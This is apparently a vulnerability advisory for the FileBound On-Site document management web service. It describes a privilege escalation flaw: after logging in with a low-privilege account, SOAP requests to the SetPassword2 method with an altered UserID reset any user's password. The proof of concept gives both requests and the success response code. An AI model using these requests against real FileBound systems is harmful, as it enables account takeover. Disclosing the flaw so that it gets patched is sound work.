Details.
The FileBound On-Site document management application is
vulnerable to a privilege escalation attack by sending a
modified password request to the FileBound web service.
By modifying the UserID value you can reset the password
of any local user in the application without requiring
administrative privileges.

Proof of Concept.
Authenticate to FileBound via the following web service
method and SOAP request:

http://www.company.com/Filebound.asmx?op=Login
   <soapenv:Body>
      <fil:Login>
         <fil:UserName>sosuser</fil:UserName>
         <fil:Password>daisyp0p</fil:Password>
      </fil:Login>
   </soapenv:Body>

After authentication a request can be sent to the following
administrator's password reset web service method and
SOAP request:

http://www.company.com/Filebound.asmx?op=SetPassword2
   <soapenv:Body>
      <fil:SetPassword2>
         <fil:UserID>32</fil:UserID>
         <fil:Password>lightsouthern</fil:Password>
         <fil:ResetPasswordExpires>0</fil:ResetPasswordExpires>
      </fil:SetPassword2>
   </soapenv:Body>

By modifying the UserID value the password can be reset for
any existing user in the system. A response code of -1
confirms the password reset was successful.

Solution.
Install the latest vendor patch.
